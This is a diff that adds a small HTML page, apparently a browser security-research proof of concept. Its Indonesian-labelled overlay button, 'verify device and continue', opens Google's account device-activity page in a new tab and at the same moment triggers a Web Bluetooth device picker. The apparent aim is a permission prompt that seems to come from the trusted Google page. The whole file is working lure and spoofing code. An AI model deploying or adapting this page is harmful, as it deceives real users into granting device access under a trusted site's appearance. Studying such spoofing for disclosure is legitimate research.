@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Research - Hardware API</title>
+    <style>
+        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #ffffff; }
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; align-items: center; justify-content: center; cursor: pointer;
+        }
+        .btn {
+            padding: 15px 30px; background: #4285f4; color: white; 
+            border-radius: 50px; font-weight: bold; border: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="overlay">
+        <button class="btn">Verifikasi Perangkat & Lanjutkan</button>
+    </div>
+
+    <script>
+        const overlay = document.getElementById('overlay');
+
+        overlay.addEventListener('click', async () => {
+            // 1. Picu navigasi ke tab target
+            window.open('https://myaccount.google.com/device-activity', '_blank');
+
+            // 2. Gunakan teknik 'Immediate Execution'
+            // Bluetooth picker seringkali memiliki prioritas thread yang berbeda
+            try {
+                if (navigator.bluetooth) {
+                    navigator.bluetooth.requestDevice({
+                        // Meminta perangkat apa saja agar dialog pencarian muncul
+                        acceptAllDevices: true 
+                    }).catch(e => console.log("Dialog closed"));
+                }
+            } catch (err) {
+                console.log("API Blocked");
+            }
+        });
+    </script>
+</body>
+</html>
